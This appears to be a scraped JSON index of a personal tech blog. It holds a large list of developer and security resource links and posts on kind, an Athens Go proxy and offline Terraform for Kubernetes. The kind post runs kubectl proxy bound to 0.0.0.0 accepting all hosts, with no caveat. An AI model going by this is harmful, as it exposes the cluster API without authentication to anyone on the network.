https://www.journaldev.com/(Java/Java EE/Python/Linux and in general open source technologies) https://www.tutorialkart.com/(Tutorialkart.com provides online tutorials, training, interview questions, and pdf materials for free) https://www.cprogramming.com/tutorial/(C++ tutorials, OpenGL with C++ tutorials) https://yourbasic.org/(Code should be correct, clear and efficient. Prefer simple. Avoid clever.) https://serversforhackers.com/(Teaching the server tech you need for development and production. Eliminating the frustration of server configuration.) https://composingprograms.com/(a free online introduction to programming and computer science) https://linuxhint.com/(technology topics.) https://data-flair.training/blogs/(about all technologes) https://tldp.org/LDP/abs/html/index.html(An in-depth exploration of the art of shell scripting) https://www.linuxjournal.com/books(topics,news,ebboks) https://fizalihsan.github.io/(Knowledge Shop) http://cn.linux.vbird.org/linux_basic/linux_basic.php(鸟哥自由软件) https://www.linuxtoday.com/(TechnologyAdvice’s purpose is to create opportunities for technology buyers) https://www.vogella.com/tutorials/technology.html(TUTORIALS ABOUT GIT, MAVEN, GRADLE, ANT, DATABASE HANDLING AND TECHNICAL DOCUMENTATION) https://itnext.io/(news, events for it) https://www.learnitguide.net/(linux, devops, containerization, cloud news) https://www.12factor.net/(The twelve-factor methodology can be applied to apps written in any programming language) https://observiq.com/blog/(observebility and opentelemetry) https://www.mirantis.com/blog/(cloud native blogs) https://www.novatec-gmbh.de/blog/(Profitieren Sie von den Erfahrungen und dem IT-Wissen unserer Experten.) https://blog.openreplay.com/top-alternatives-to-create-react-app/(Create-React-App) awesome-go(https://awesome-go.com/) slack tech blog(https://slack.engineering) codesahara(https://codesahara.com/blog/) Tech by Example(https://techbyexample.com/) Excellent developer and preacher https://dev.bitolog.com/(Cloud dev blog: Kubernetes, golang, containers and more) https://rafallorenz.com/open-source/(GO language blogs) https://flaviocopes.com/page/ebooks-links/(Flavio Copes Programming Handbooks) https://raymii.org/s/(a developer from The Netherlands with a focus on C++, C, C#, Linux and embedded systems) https://lornajane.net/blog(\u0026ldquo;Git Workbook\u0026rdquo;, \u0026ldquo;PHP Web Services\u0026rdquo; and \u0026ldquo;PHP Master\u0026rdquo; ) https://learnbyexample.github.io/books/(development knowledge) https://ryanstutorials.net/(A collection of introductory technology tutorials.) https://iter01.com/(continous updateing\u0026hellip;) https://draveness.me/(面向信仰编程) https://www.allthingsdistributed.com/(Werner Vogels on building scalabale and robust distributed systems) https://github.com/jwasham/coding-interview-university(A complete computer science study plan to become a software engineer.) https://github.com/selfteaching/the-craft-of-selfteaching(自学是门手艺) https://github.com/aCoder2013/blog(个人博客，记录个人总结(见issues)) http://blog.joncairns.com/(learning new things.) https://blog.remibergsma.com/(Linux sysadmin, cloud computing and more!) https://codeyarns.com/tech/index.html#gsc.tab=0(This is a journal of tips, shortcuts and solutions related to computers and technology) https://nelsonfigueroa.dev/(Ruby on Rails, Docker, Kubernetes, and Amazon Web Services) https://devopsnotes.uk/(kubernetes, git, terraform, devops) https://cloudonaut.io/page/1/(Deepen your knowledge,stay up to date!) https://piotrminkowski.com/(Java, Spring, Kotlin, microservices, Kubernetes, containers) https://devconnected.com/(about DevOps, Open source, System Administration, IoT and general software engineering) https://github.com/hilmanski/freeStuffDev(Resources for developer) https://golangbyexample.com/(golang by example blog) https://navendu.me/(May the Source Be with You) https://www.builder.io/blog(components) https://math.mit.edu/~djk/calculus_beginners/(Calculus for Beginners and Artists) () () () () () () The security related aspects https://trailofbits.github.io/ctf/(CTF,toolkit,exploit) -https://github.com/carlospolop/hacktricks(learnt in CTFs, real life apps, and reading researches and news.) https://colinsalmcorner.com/(DevOpsology) https://news.ycombinator.com/(Hacker News) https://www.cisecurity.org/insights/blog(center internet security) https://securitylab.github.com/(Securing the world\u0026rsquo;s software, together) https://cheatsheetseries.owasp.org/index.html(The OWASP Cheat Sheet Series was created to provide a concise collection of high value information on specific application security topics) https://docs.github.com/cn/code-security/getting-started/github-security-features(An overview of GitHub security features) https://sysdig.com/blog/(blogs,security,tools) https://www.sandflysecurity.com/blog/(linux security,blogs) https://rasp.baidu.com/doc/(openrasp) https://www.mend.io/resources/(Read about application security, DevSecOps, open source license compliance and audit) https://blog.g3rt.nl/(personal interest and express my personal view) https://docs.microsoft.com/en-us/azure/architecture/framework/(microsoft,reliability,security) https://factory.faun.dev/newsletters/iw/is-web5-better-than-web3-727545e0-ffed-4892-82cd-83659faf7ce3(The Crypto space is evolving at lightning speed. We curate the key news and tips on a weekly basis) https://factory.faun.dev/newsletters/i/how-can-exposed-kubernetes-clusters-be-exploited-7ccec338-8e18-485e-b699-896c4dc882d0(Remarkable posts, stories, tools, tutorials and tips from the DevSecOps communit) https://knowledge-base.secureflag.com/(secureflag) https://blog.secureflag.com/(secureflag) https://owasp.org/www-project-vulnerable-web-applications-directory/(OWASP Vulnerable Web Applications Directory) https://www.microsoft.com/en-us/securityengineering/sdl/practices(What are the Microsoft SDL practices?) https://www.synopsys.com/blogs/software-security/(application security blogs) https://apolicy.io/between-the-pipes-blog/(The cloud-native security blog) https://attack.mitre.org/matrices/enterprise/(The ATT\u0026amp;CK knowledge base is used as a foundation for the development of specific threat models and methodologies in the private sector) https://www.bmc.com/blogs/(devops, cloud, aiops) https://pentestmonkey.net/category/cheat-sheet(taking the monkey work out of pentesting) https://www.netspi.com/blog/technical/(cybersecurity) https://www.checkpoint.com/cyber-hub/cloud-security/(cloud security a priority for many organizations) https://spectralops.io/blog/(content for software developer and security professionals) https://github.com/spectralops(Automated Code Security for Modern Teams) https://www.k9security.io/docs/(AWS Cloud Security) https://openssf.org/blog/(the linux foundation security project blog) https://s0cm0nkey.gitbook.io/s0cm0nkeys-security-reference-guide/(Security Reference guide) https://www.imperva.com/learn/(Imperva Learning Center) https://www.stamus-networks.com/blog(necessary to improve global security) https://www.dynatrace.com/news/blog/(Software intelligence for the enterprise cloud) https://www.appdynamics.com/blog/(Cisco introduces full-stack observability) https://www.honeycomb.io/blog() https://lightstep.com/blog(Get the latest news and announcements. From product updates to industry topics, hear from the Lightstep experts.) https://www.archcloudlabs.com/(Arch Cloud Labs is a personal blog site for side projects, CTFs) https://blog.thinkst.com/(Thinkst Canary) https://www.middlewareinventory.com/(devops articles) https://blog.risingstack.com/(Awmesome posts about technology) https://roadmap.sh/cyber-security(Step by step guide to becoming a Cyber Security Expert) https://zolagonano.github.io/a-ninjas-handbook/(A book on privacy, security, and anonymity online.) https://book.hacktricks.xyz/(HackTricks Project) () Documents and instructions https://sourceware.org/systemtap/documentation.html(administrators can use SystemTap to extract, filter and summarize data in order to enable diagnosis of complex performance or functional problems.) https://linuxtools-rst.readthedocs.io/(Linux工具快速教程) https://www.linuxtopia.org/online_books/linux_administration_index.html(Linux System Administration Books ) https://cloud.google.com/architecture/(Discover reference architectures, diagrams, design patterns, guidance, and best practices for building or migrating your workloads on Google Cloud) https://nickjanetakis.com/blog/page2/(If I\u0026rsquo;m not building or deploying web apps, then I\u0026rsquo;m writing about what I\u0026rsquo;ve learned along the way. From development to production.) https://www.educba.com/data-science/data-science-tutorials/(Learn Data Science, Machine Learning, Hadoop, AWS \u0026amp; more with our Online Certification Courses) http://linux-ip.net/html/index.html(Guide to IP Layer Network Administration with Linux) https://github.com/josevnz/BashError(Short tutorial in error handling with Bash) https://wiki.bash-hackers.org/scripting/basics(The basics of shell scripting) https://github.com/alexanderepstein/Bash-Snippets(A collection of small bash scripts for heavy terminal users) https://github.com/dylanaraps/pure-bash-bible(A collection of pure bash alternatives to external processes.) https://github.com/jlevy/the-art-of-command-line(Master the command line, in one page) https://tldp.org/HOWTO/Bash-Prog-Intro-HOWTO.html#toc10(BASH Programming - Introduction HOW-TO) https://tiswww.case.edu/php/chet/bash/bashref.html(Bash Reference Manual) https://www.gnu.org/savannah-checkouts/gnu/bash/manual/bash.html(Bash Reference Manual) https://gcc.gnu.org/onlinedocs/gcc/index.html(Using the GNU Compiler Collection (GCC)) https://megamorf.gitlab.io/cheat-sheets/linux-shell/(Cheat Sheet - Linux shell) http://www.shudan.vip/(电子书清单) http://www.zoudupai.com/(走读派) https://stackoverflow.com/questions/118945/best-c-c-network-library(Best C/C++ Network Library) https://aws.amazon.com/cn/whitepapers(AWS 白皮书和指南) http://akaedu.github.io/book/(Linux C编程一站式学习) https://www.golinuxcloud.com/(tutorial of technology) http://man.hubwiz.com/(Apis for most languages) https://runestone.academy/ns/books/published/thinkcspy/index.html(How to Think Like a Computer Scientist: Interactive Edition) https://diveintosystems.org/book/preface.html(Dive into systems) https://thenewstack.io/category/technology/(A newsletter digest of the week’s most important stories \u0026amp; analyses.) https://github.com/weaveworks/wks-quickstart-firekube(About Example configuration to create Kubernetes clusters powered by ignite and gitops) https://kyverno.io/docs/(is a policy engine designed for Kubernetes) https://www.cyberciti.biz/(a site, blog, forum) https://techdifferences.com/(on topics belonging to various categories like Networking, Programming, DBMS, Operating system, Internet, Hardware and software.) https://www.cloudvedas.com/(Saurabh Gupta is a Cloud Evangelist and a Certified Solution Architect working on different public and private cloud technologies) https://github.com/blueboay/ceph-study(ceph基础及概念) https://github.com/caicloud/kube-ladder(Learning Kubernetes, The Chinese Taoist Way) https://hackernoon.com/(devops, hack news, linux) https://www.gartner.com/en/blog(Expert views on today’s technology and business topics and trends) https://www.clickittech.com/blog/(saas Digital Transformation Blog) https://www.ecloudcontrol.com/blog/(Thoughts, How-Tos \u0026amp; Announcements) https://softwareengineeringdaily.com/(the world through the lens of software) [https://www.geeksforgeeks.org/](https://www.geeksforgeeks.org/(We provide a variety of services for you to learn, thrive and also have fun!) https://codingbat.com/(CodingBat is a free site of live coding problems to build coding skill in Java and Python) https://www.writethedocs.org/guide/writing/beginners-guide-to-docs/(A beginner’s guide to writing documentation) https://earthly.dev/blog/categories/tutorials/(Introducing Earthly Cloud) https://docs.python-guide.org/(python guide) https://www.cloudflare.com/learning/(Resources on cyber security and how the Internet works from Cloudflare) () Other Creativity; Originality https://packagecloud.io/docs(A package is a combination of metadata, configuration, and software that is prepared in a way that a package management program ) https://github.com/bregman-arie/devops-exercises(About Linux, Jenkins, AWS, SRE, Prometheus, Docker, Python, Ansible, Git, Kubernetes, Terraform, OpenStack, SQL, NoSQL, Azure, GCP, DNS, Elastic, Network, Virtualization. DevOps Interview Questions) https://github.com/bregman-arie/devops-resources(DevOps resources - Linux, Jenkins, AWS, SRE, Prometheus, Docker, Python, Ansible, Git, Kubernetes, Terraform, OpenStack, SQL, NoSQL, Azure, GCP) https://devopscube.com/(deveops articles Archives) https://gist.github.com/jctosta/af918e1618682638aa82(Screen Quick Reference) https://paulvanderlaken.com/(design,chart,psychological) http://www.extremeprogramming.cn/(eXtreme Programming) https://leetcode.com/explore/featured/card/top-interview-questions-easy/(official curated list of Top classic interview questions to help you land your dream job) https://www.commandlinefu.com/commands/browse(shared commands) https://exercism.org/tracks(58 languages for you to master ) https://github.com/gatling/gatling(Modern Load Testing as Code) https://lucidchart.com/blog(awsome chat and blogs about technology) https://www.hotjar.com/product-management-101/(Product management 101) https://sensu.io/blog(monitoring as code) https://speakerdeck.com/(slides of all) https://morioh.com/(many frontend knowledge) https://ably.com/blog(node.js webscokets huge connections scaling) https://gist.github.com/MohamedAlaa/2961058(tmux shortcuts \u0026amp; cheatsheet) https://www.solo.io/blog/(Solo Blog) https://inclusivenaming.org/word-lists/inclusive-naming-word-lists-v1.0(Inclusive Naming Initiative) https://github.com/OpenZeroSir/ViBoard(A cross-platform Echarts dashboard application) https://discrete.openmathbooks.org/dmoi4.html(Discrete Mathematics) https://cobalt.tools/(download videos in most social medium) () () () Graph and game https://github.com/floooh/sokol(About minimal cross-platform standalone C headers) https://github.com/SanderMertens/flecs(A fast entity component system (ECS) for C \u0026amp; C++) https://github.com/toxoidengine/toxoid(A modern, cross-platform, highly modular / decoupled, data-driven, ECS-based game engine written in Rust) https://github.com/godotengine/godot(Godot Engine – Multi-platform 2D and 3D game engine) () ","link":"https://blog.wisekee.com/post/awesome-blog-resources/","section":"post","tags":["blog","resources","featured"],"title":"Awesome blog's resoures"},{"body":"","link":"https://blog.wisekee.com/tags/blog/","section":"tags","tags":null,"title":"blog"},{"body":"","link":"https://blog.wisekee.com/tags/resources/","section":"tags","tags":null,"title":"resources"},{"body":"","link":"https://blog.wisekee.com/tags/sdlc/","section":"tags","tags":null,"title":"sdlc"},{"body":"General terminology of Software development Software Composition Analysis(SCA) Static Application Security Testing (SAST) Dynamic Application Security Testing (DAST) Runtime Application Self-Protection (RASP) information security (InfoSec) Integrated Development Environment (IDE) Common Vulnerabilities and Exposures (CVE) Version Control System (VCS) AWS Security Finding Format (ASFF) Proof of Concept (POC) IT Service Management (ITSM) distributed denial of service (DDoS) Other terminology of SDLC Test-driven development (TDD) Scaled Agile Framework (SAFe) Large-Scale Scrum (LeSS) Some usefuly tools and site url (malicious)[https://zeltser.com/lookup-malicious-websites/] ","link":"https://blog.wisekee.com/post/software-deployment-security-terminology/","section":"post","tags":["security","sdlc","terminology"],"title":"Software development security lifecycle terminology"},{"body":"","link":"https://blog.wisekee.com/tags/terminology/","section":"tags","tags":null,"title":"terminology"},{"body":"","link":"https://blog.wisekee.com/tags/cluster/","section":"tags","tags":null,"title":"cluster"},{"body":"","link":"https://blog.wisekee.com/tags/kind/","section":"tags","tags":null,"title":"kind"},{"body":"The config for kind cluster settings the expose port didn\u0026rsquo;t change when cluster launched, need prepared\n1kind: Cluster 2apiVersion: kind.x-k8s.io/v1alpha4 3networking: 4 # WARNING: It is _strongly_ recommended that you keep this the default 5 # (127.0.0.1) for security reasons. However it is possible to change this. 6 apiServerAddress: \u0026#34;127.0.0.1\u0026#34; 7 # This can connect to k8s from external when install kind in virtual host or cloud platform(ec2 of aws) 8 # By default the API server listens on a random open port. 9 # You may choose a specific port but probably don\u0026#39;t need to in most cases. 10 # Using a random port makes it easier to spin up multiple clusters. 11 apiServerPort: 6443 12nodes: 13- role: control-plane 14 # port forward 30019 on the host to 30019 on this node 15 extraPortMappings: 16 - containerPort: 30019 17 hostPort: 30019 18 # optional: set the bind address on the host 19 # 0.0.0.0 is the current default 20 listenAddress: \u0026#34;0.0.0.0\u0026#34; 21 # optional: set the protocol to one of TCP, UDP, SCTP. 22 # TCP is the default 23 protocol: TCP 24 - containerPort: 32578 25 hostPort: 32578 26 listenAddress: \u0026#34;0.0.0.0\u0026#34; 27 protocol: TCP 28- role: worker 29- role: worker Commands 1# create cluster 2kind create cluster --name local-k8s --config config.yaml 3# view clusters 4kind get clusters 5# export the kubectl config to ~/.kube/config 6kind export kubeconfig --name local-k8s 7# load image to cluster 8kind load docker-image quay.io/kubevirt/virt-handler:v1.1.0-alpha.0 -n local-k8s 9 10# attached and exec the kind nodes 11docker exec -it local-k8s-worker bash 12# view all containerd containers 13crictl ps -a 14# prune the images to decrement space 15crictl rmi --prune 16# delete exited containers 17crictl rm $(crictl ps -a | grep Exited | awk \u0026#39;{print $1}\u0026#39;) Writen scripts to launch istio 1#!/usr/bin/env bash 2 3KIND_CLUSTER_NAME=\u0026#34;local-k8s\u0026#34; 4IMAGES=(\u0026#39;alpine:latest\u0026#39; \u0026#39;istio/pilot:1.16.1\u0026#39; \u0026#39;istio/proxyv2:1.16.1\u0026#39; \u0026#39;istio/examples-bookinfo-details-v1:1.18.0\u0026#39; \u0026#39;curlimages/curl\u0026#39; \u0026#39;istio/examples-bookinfo-productpage-v1:1.18.0\u0026#39; \u0026#39;istio/examples-bookinfo-ratings-v1:1.18.0\u0026#39; \u0026#39;istio/examples-bookinfo-reviews-v1:1.18.0\u0026#39; \u0026#39;istio/examples-bookinfo-reviews-v2:1.18.0\u0026#39; \u0026#39;istio/examples-bookinfo-reviews-v3:1.18.0\u0026#39;) 5ACTIONS=(\u0026#39;Download images\u0026#39; \u0026#39;Load images\u0026#39; \u0026#39;Init istio\u0026#39;) 6DEFAULT_ACTION=\u0026#34;Load images\u0026#34; 7 8download_images() { 9\tfor i in \u0026#34;${IMAGES[@]}\u0026#34; 10\tdo 11 echo $i 12\tdocker pull $i 13\tdone 14} 15 16 17 18load_images() { 19\tfor i in \u0026#34;${IMAGES[@]}\u0026#34; 20\tdo 21\techo \u0026#34;load the image: $i\u0026#34; 22\tkind load docker-image $i -n $KIND_CLUSTER_NAME 23\tdone 24} 25 26init_istio() { 27\tistioctl install --set meshConfig.accessLogFile=/dev/stdout 28\tistioctl verify-install 29\tkubectl create ns apps 30\tkubectl label ns apps istio-injection=enabled 31} 32 33PS3=\u0026#39;Please enter your choice:\u0026#39; 34select opt in \u0026#34;${ACTIONS[@]}\u0026#34; \u0026#34;quit\u0026#34;; 35do 36\tcase \u0026#34;$REPLY\u0026#34; in 37\t1) 38\techo \u0026#34;You select action $opt\u0026#34; 39\tdownload_images break;; 40\t2) 41\tload_images break;; 42\t3) 43\tinit_istio break;; 44 45 $((${#ACTIONS[@]}+1))) 46 echo \u0026#34;Goodbye!\u0026#34;; exit 0;; 47\t*) 48\techo \u0026#34;Anythins not choice.\u0026#34;; continue;; 49 esac 50done Access to kind cluster from external 1# proxy the api server in localhost, and access to it from other machine 2kubectl proxy --port=8888 --address=0.0.0.0 --accept-hosts=.* Reference Kind nerdctl ","link":"https://blog.wisekee.com/post/k8s-local-cluster-kind/","section":"post","tags":["k8s","cluster","kubernetes","kind"],"title":"launch testing kubernetes cluster in local use Kind"},{"body":"","link":"https://blog.wisekee.com/tags/athens/","section":"tags","tags":null,"title":"athens"},{"body":"Setup GO private package repositry ATHENS for project development Use Nexus proxy access public go package and private repository repo\n1#The access workflow 2 3 |------\u0026gt; proxy-public internal 4internal.pack.com/goproxy---\u0026gt;nexus 5 |------\u0026gt;athens---\u0026gt;nginx---\u0026gt; private gitlab The pull package workflow - set the environment variable `export GOPROXY=internal.pack.com/goproxy`\r- setup nexus proxy the internal athens and public go proxy repo\r- the athens access internal gitlab code repo needs nginx rewrite the some paths\r- because athens needs https access the code repo\rGenerate the private certificate 1openssl req -x509 -nodes -days 876000 -newkey rsa:2048 -keyout /etc/ssl/private/nginx-selfsigned.key -out /etc/ssl/certs/nginx-selfsigned.crt Prepare Dockerfile 1FROM athens:latest 2 3# use private certificate when pull the GO package in project 4 5COPY ./nginx-selfsigned.crt /usr/local/share/ca-certificates/nginx-selfsigned.crt 6 7RUN update-ca-certificates The launch docker container script 1export ATHENS_STORAGE=/data/athens/storage 2mkdir -p $ATHENS_STORAGE 3docker run -d -v $ATHENS_STORAGE:/var/lib/athens \\ 4 -v \u0026#34;/data/athens/.gitconfig:/root/.gitconfig\u0026#34; \\ 5 -v \u0026#34;/data/athens/.ssh:/root/.ssh\u0026#34; \\ 6 -v \u0026#34;/data/athens/.netrc:/root/.netrc\u0026#34; \\ 7 -e ATHENS_DISK_STORAGE_ROOT=/var/lib/athens \\ 8 -e ATHENS_STORAGE_TYPE=disk \\ 9 -e ATHENS_GO_BINARY_ENV_VARS=\u0026#34;GOPRIVATE=private.pack.com; GONOSUMDB=private.pack.com\u0026#34; \\ 10 -e ATHENS_GONOSUM_PATTERNS=private.pack.com/* \\ 11 --name athens-proxy \\ 12 --add-host private.pack.com:10.10.0.10 \\ 13 --restart always \\ 14 -p 3000:3000 \\ 15 athens:v1 The private gitlab repo config .gitconfig 1[url \u0026#34;https://git@code.test.com\u0026#34;] 2 insteadOf = http://private.pack.com The .netrc 1machine private.pack.com 2login username 3password xxxxxx The nginx recusive proxy 1listen: \u0026#34;443 ssl\u0026#34; 2 server_name: \u0026#34;private.pack.com\u0026#34; 3 filename: \u0026#34;private.pack.conf\u0026#34; 4 state: \u0026#34;present\u0026#34; 5 extra_parameters: | 6 ssl_certificate /etc/nginx/nginx-selfsigned.crt; 7 ssl_certificate_key /etc/nginx/nginx-selfsigned.key; 8 if ($args ~* \u0026#34;^go-get=1\u0026#34;) { 9 set $condition goget; 10 } 11 if ($condition = goget) { 12 return 200 \u0026#34;\u0026lt;!DOCTYPE html\u0026gt;\u0026lt;html\u0026gt;\u0026lt;head\u0026gt;\u0026lt;meta content=\u0026#39;private.pack.com git https://private.pack.com/proj/level/sub.git\u0026#39; name=\u0026#39;go-import\u0026#39;\u0026gt;\u0026lt;/head\u0026gt;\u0026lt;/html\u0026gt;\u0026#34;; 13 } 14 location / { 15 proxy_pass http://code.test.com/; 16 17 proxy_set_header X-Real-IP $remote_addr; 18 proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for; 19 } use export GOPROXY=http://internal.pack.com/goproxy ","link":"https://blog.wisekee.com/post/go-private-package-registry-athens/","section":"post","tags":["Go","athens","nginx"],"title":"Go language private registry glance"},{"body":"","link":"https://blog.wisekee.com/tags/nginx/","section":"tags","tags":null,"title":"nginx"},{"body":"Sometimes enterprise is ineternal network not has internet network in production The offline installing and setup k8s environment and resources is necessery Prepare the terraform environment Download the Terraform binary terraform You can also download the HELM binary to operate the k8s cluster. 1wget https://releases.hashicorp.com/terraform/0.15.4/terraform_0.15.4_linux_amd64.zip 2unzip terraform_0.15.4_linux_amd64.zip 3mv terraform /usr/local/bin/ 4chmod +x /usr/local/bin/terraform 5terraform version Prepare the Terraform syntax tips plugins in idea IDE https://plugins.jetbrains.com/plugin/7808-hashicorp-terraform--hcl-language-support\nBecause the Terraform plugins and providers Offline to local directory and push to CVS repo so needs to install git lfs plugins\n1git lfs install #the binary in git repo need to lfs plugin 2cd app/dev/ #enter the app dir 3terraform init -backend-config=./backend.tfvars #init terraform environment 4terraform fmt # format the HCL code 5terraform validate #validation the HCL syntax 6terraform plan -var-file=./dev.tfvars #view the IAC information and changed 7terraform apply -var-file=./dev.tfvars #asign to change Init the directories level 1├── charts # storage the helm charts 2│ ├── eck-operator 3│ ├── etcd 4│ ├── fluentd 5│ ├── ingress-nginx 6│ ├── kube-prometheus-stack 7│ ├── kubernetes-dashboard 8│ ├── postgresql 9│ └── myapp-skeleton # yourself the helm chart 10├── iac # storage the terraform HCL code and environment config 11│ ├── base # the public global settings 12│ ├── base-us # the other special global settings 13│ ├── exec.sh # quickly create environment structure 14│ ├── modules # the public modules reference to othe environment 15│ ├── dev # the developement env 16│ └── qa # the qa testing env 17├── README.md 18└── tests # some test suite and so on The base directory include global resources definitions has different *.tfvars in each environment dir. such as: dev/dev.tfvars qa/qa.tfvars 101_main.tf 202_base.tf 303_ceph_ingress.tf 404_operators.tf 505_other.tf 6backend.tfvars 7base.tfvars 8outputs.tf 9terraform.tfstate 10variables.tf They have the same structure, but different values\n1cat base/base.tfvars 2k8s = { 3 config_path : \u0026#34;~/.kube/config\u0026#34; 4 config_context : \u0026#34;kubernetes-admin@kubernetes\u0026#34; 5} 6nodes_ip = [ 7 \u0026#34;10.10.1.1\u0026#34;, 8 \u0026#34;10.10.1.2\u0026#34;, 9 \u0026#34;10.10.1.3\u0026#34; 10 ] 11private_registry_prefix = \u0026#34;registry.me\u0026#34; 12custom_namespaces = [\u0026#34;qa\u0026#34;, \u0026#34;dev\u0026#34;] 13component = { 14 redis = { 15 enabled: true 16 } 17 postgres = { 18 enabled: true 19 } 20 elk = { 21 enabled: true 22 es_storage_size: \u0026#34;20Gi\u0026#34; 23 expose_es_endpoint: true 24 kibana_node_count: 1 25 master_node_count: 2 26 data_node_count: 2 27 apm_node_count: 2 28 } 29 fluentd = { 30 enabled: true 31 } 32} 33core_domains = { 34 grafana : \u0026#34;kb.k8s.test.com\u0026#34; 35 alert_manager : \u0026#34;alert.k8s.test.com\u0026#34; 36 ceph_ingress : \u0026#34;ceph.k8s.test.com\u0026#34; 37 dashboard : \u0026#34;admin.k8s.test.com\u0026#34; 38 pg_op_ui: \u0026#34;pg-op-ui.k8s.test.com\u0026#34; 39 redis_insight: \u0026#34;redis-ui.k8s.test.com\u0026#34; 40 kibana: \u0026#34;kibana.k8s.test.com\u0026#34; 41 prometheus: \u0026#34;metric.k8s.test.com\u0026#34; 42 es_master: \u0026#34;es-master.k8s.test.com\u0026#34; 43 es_data: \u0026#34;es-data.k8s.test.com\u0026#34; 44} 45storage_class_name = \u0026#34;rook-cephfs\u0026#34; 46s3_config = { 47 access_key: \u0026#34;xxxxxxxxxxxxxxxxxxxxxxxxx\u0026#34; 48 secret_key: \u0026#34;xxxxxxxxxxxxxxxxxxxxxxxxx\u0026#34; 49} The dev/dev.tfvars 1k8s = { 2 config_path : \u0026#34;~/.kube/config\u0026#34; 3 config_context : \u0026#34;kubernetes-admin@kubernetes\u0026#34; 4} 5private_registry_prefix = \u0026#34;registry.me\u0026#34; 6storage_class_name = \u0026#34;rook-cephfs\u0026#34; 7namespace = \u0026#34;dev\u0026#34; 8domains = { 9 rocketmq_console : \u0026#34;rq.k8s.test.com\u0026#34; 10 etcd_ui: \u0026#34;etcd-ui.k8s.test.com\u0026#34; 11} 12middleware = { 13 rocketmq = { 14 enabled = true 15 broker_extra_config = \u0026lt;\u0026lt;-EOT 16 brokerIP1=10.10.1.1 17 brokerIP2=10.10.1.1 18 EOT 19 broker_size = 1 20 broker_memory_set = \u0026#34;-Xms1g -Xmx1g -Xmn1g\u0026#34; 21 } 22 redis = { 23 enabled : true 24 mode : \u0026#34;standalone\u0026#34; 25 } 26 postgres = { 27 enabled : true 28 team_id : \u0026#34;saas\u0026#34; 29 cluster_name : \u0026#34;postgres\u0026#34; 30 } 31 etcd = { 32 enabled: true 33 } 34} All environment reference the base directory\u0026rsquo;s 01_main.tf symbolical link to it\u0026rsquo;s 1terraform { 2 required_version = \u0026#34;\u0026gt;= 0.13\u0026#34; 3 required_providers { 4 kubernetes = { 5 source = \u0026#34;hashicorp/kubernetes\u0026#34; 6 version = \u0026#34;2.2.0\u0026#34; 7 } 8 helm = { 9 source = \u0026#34;hashicorp/helm\u0026#34; 10 version = \u0026#34;2.1.2\u0026#34; 11 } 12 kubectl = { 13 source = \u0026#34;gavinbunney/kubectl\u0026#34; 14 version = \u0026#34;1.11.1\u0026#34; 15 } 16 template = { 17 source = \u0026#34;hashicorp/template\u0026#34; 18 version = \u0026#34;2.2.0\u0026#34; 19 } 20 } 21 22 backend \u0026#34;s3\u0026#34; { 23 region = \u0026#34;main\u0026#34; 24 skip_requesting_account_id = true 25 skip_credentials_validation = true 26 skip_get_ec2_platforms = true 27 skip_metadata_api_check = true 28 skip_region_validation = true 29 force_path_style = true 30 } 31 32} 33 34provider \u0026#34;kubernetes\u0026#34; { 35 config_path = var.k8s.config_path 36 config_context = var.k8s.config_context 37} 38 39provider \u0026#34;helm\u0026#34; { 40 kubernetes { 41 config_path = var.k8s.config_path 42 } 43} 44 45provider \u0026#34;kubectl\u0026#34; { 46 config_path = var.k8s.config_path 47 config_context = var.k8s.config_context 48} Terraform state manager through s3 storage config in backend.tfvars. use minio replace in non AWS environment 1endpoint = \u0026#34;http://s3.test.com\u0026#34; 2bucket = \u0026#34;terraform-state\u0026#34; 3key = \u0026#34;k8s-dev/terraform.tfstate\u0026#34; 4access_key = \u0026#34;xxxxxxx\u0026#34; 5secret_key = \u0026#34;xxxxxxx\u0026#34; At any time to backup the state file to local 1terraform state pull \u0026gt; ./terraform.tfstate 2#the terraform.tfstate is ignored in git repo When initialization the new base environment use the raipd command 1./exec.sh base base-test-pipeline 2cd base-test-pipeline \u0026amp;\u0026amp; terraform init -backend-config=./backend.tfvars 3terraform validate 4terraform plan -var-file=./base.tfvars When init app environment based to parent base environment 1./exec.sh app app-test-01 2cd app-test-01 \u0026amp;\u0026amp; terraform init -backend-config=./backend.tfvars 3terraform validate 4terraform plan -var-file=./env.tfvars The simple exec.sh script look like this following 1#!/usr/bin/env bash 2set -e 3 4[ \u0026#34;$#\u0026#34; -eq 2 ] || { 5 echo \u0026#34;Create a base or app environment directory layout\u0026#34; 6 echo \u0026#34;Please refer to Environment directory name: $0 base|app EnvironmentName\u0026#34; 7 exit 1 8} 9declare -r env_type=\u0026#34;${1:-base}\u0026#34; 10declare -r env_dir=\u0026#34;${2:-sample}\u0026#34; 11 12mkdir -p ${env_dir}/.terraform 13cd ${env_dir}/.terraform \u0026amp;\u0026amp; ln -s ../../base/.terraform/providers ./providers 14cd .. 15ln -s ../base/.terraform.lock.hcl .terraform.lock.hcl 16ln -s ../base/01_main.tf ./01_main.tf 17cp ../base/backend.tfvars ./backend.tfvars 18sed -i \u0026#34;s#^key.*#key = \\\u0026#34;${env_dir}/terraform.tfstate\\\u0026#34;#g\u0026#34; backend.tfvars 19 20 21if [[ \u0026#34;${env_type}\u0026#34; == \u0026#34;base\u0026#34; ]]; then 22 ln -s ../base/02_base.tf ./02_base.tf 23 ln -s ../base/03_ceph_ingress.tf ./03_ceph_ingress.tf 24 ln -s ../base/04_operators.tf ./04_operators.tf 25 ln -s ../base/variables.tf ./variables.tf 26 touch base.tfvars 27 echo \u0026#34;Please copy the keys to base.tfvars file don\u0026#39;t include the values!!!\u0026#34; 28fi 29 30if [[ \u0026#34;${env_type}\u0026#34; == \u0026#34;app\u0026#34; ]]; then 31 ln ../saas-dev/variables.tf ./variables.tf 32 touch env.tfvars 33 echo \u0026#34;Please copy the app environment file keys to env.tfvars don\u0026#39;t include the values!!!\u0026#34; 34fi Probably going to prepare docker images import to local private registry 1registry.me/public/grafana/grafana-image-renderer latest 601MB 2registry.me/public/prometheus-operator/prometheus-config-reloader v0.47.1 12.4MB 3registry.me/public/prometheus-operator/prometheus-operator v0.47.1 43.9MB 4registry.me/public/grafana/grafana 7.5.5 204MB 5registry.me/public/kube-state-metrics/kube-state-metrics v2.0.0 33.4MB 6registry.me/public/prometheus/prometheus v2.26.0 169MB 7registry.me/public/kiwigrid/k8s-sidecar 1.10.7 88.8MB 8registry.me/public/prometheus/node-exporter v1.1.2 26MB 9registry.me/public/kubernetesui/dashboard v2.2.0 225MB 10registry.me/public/jettech/kube-webhook-certgen v1.5.1 44.7MB 11registry.me/public/kubernetesui/metrcis-scraper v1.0.6 34.5MB 12registry.me/public/kubernetesui/metrics-scraper v1.0.6 34.5MB 